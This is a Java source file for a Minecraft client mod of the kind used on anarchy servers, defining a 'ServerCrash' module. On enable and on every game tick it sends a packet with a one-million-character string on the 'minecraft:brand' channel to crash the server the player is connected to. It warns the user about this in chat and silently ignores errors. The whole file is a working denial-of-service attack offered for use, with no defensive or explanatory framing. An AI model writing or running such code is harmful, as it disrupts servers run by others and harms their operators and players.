package com.example.anarchy.modules;

import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.util.Identifier;
import io.netty.buffer.Unpooled;

public class CrashModule extends Module {
    public CrashModule() { super("ServerCrash"); }

    @Override
    public void onEnable() {
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player != null) {
            client.player.sendMessage(net.minecraft.text.Text.literal("?cWARNING: Server Crash module enabled! This may crash the server you are on. Use at your own risk."), false);
        }
        attemptCrash();
    }

    @Override public void onDisable() {}

    @Override
    public void tick(MinecraftClient client) {
        if (isEnabled() && client.getNetworkHandler() != null) {
            attemptCrash();
        }
    }

    private void attemptCrash() {
        try {
            PacketByteBuf buf = new PacketByteBuf(Unpooled.buffer());
            String longString = "A".repeat(1000000);
            buf.writeString(longString);
            ClientPlayNetworking.send(new Identifier("minecraft", "brand"), buf);
        } catch (Exception ignored) {}
    }
}
